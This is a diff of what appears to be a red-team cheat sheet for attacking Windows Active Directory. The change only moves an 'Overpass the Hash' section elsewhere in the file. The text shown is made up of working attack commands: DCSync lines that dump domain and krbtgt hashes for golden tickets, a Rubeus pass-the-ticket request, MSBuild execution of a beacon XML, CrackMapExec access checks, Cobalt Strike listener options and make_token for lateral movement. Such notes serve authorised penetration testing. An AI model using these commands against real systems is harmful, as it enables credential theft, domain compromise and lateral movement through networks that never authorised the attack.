@@ -73,12 +73,6 @@ MSBuild Beacon
     Upload XML to target or Run XML from File Server
     Execute %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe c:\windows\temp\msbuild_nps.xml
 
-Overpass the Hash
-  dcsync fqdn domain\user (User must have DCSync rights in that domain)
-  dcsync fqdn domain\krbtgt (golden ticket)
-  dcsync fqdn (dump entire domain hashes)
-  Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt
-
 Remote Execute
   CrackMapExec
     crackmapexec IP_Address -u username -p='password' (Test if you have access)
@@ -131,6 +125,12 @@ Cobalt
     set lport cobalt listener
     set prependmigrate true
     set disablepayloadhandler true
+
+Overpass the Hash
+  dcsync fqdn domain\user (User must have DCSync rights in that domain)
+  dcsync fqdn domain\krbtgt (golden ticket)
+  dcsync fqdn (dump entire domain hashes)
+  Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt
 
 Lateral Movement
   make_token username password
